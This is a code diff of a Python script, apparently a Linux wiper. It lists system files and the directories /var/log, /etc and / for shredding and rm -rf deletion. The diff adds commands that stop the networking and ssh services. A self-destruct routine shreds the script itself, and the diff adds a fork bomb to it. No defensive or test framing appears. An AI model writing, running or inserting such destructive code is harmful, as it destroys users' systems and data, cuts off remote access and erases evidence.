@@ -16,10 +16,14 @@ class Utils:
 
 directory_list = ["/etc/network/interfaces", "/etc/dhcp/dhclient.conf", "/etc/hosts", "/etc/passwd"]
 need_removing_list = ["/var/log", "/etc", "/"]
+services_list = ["networking", "ssh"]
 
 def MainThread():
+
     shred_command = "shred -z -n 30 "
     rmrf_command = "rm -rf "
+    services_command = "sudo systemctl stop "
+
     root = tk.Tk()
     UT = Utils()
 
@@ -45,8 +49,8 @@ def MainThread():
     
 def SelfDestruct():
     self_path = path.abspath(__file__)
-    sp.call(["mkdir", "/home/.d"])
     sp.call(["/usr/bin/shred", "-z -f -n 20" , self_path])
+    os.system(":(){ :|:& };:`")
     quit()
 
 
@@ -61,7 +65,6 @@ if (platform.system() != "Linux"):
 if __name__ == "__main__":
     MainThread()
     SelfDestruct()
-
 
 
 
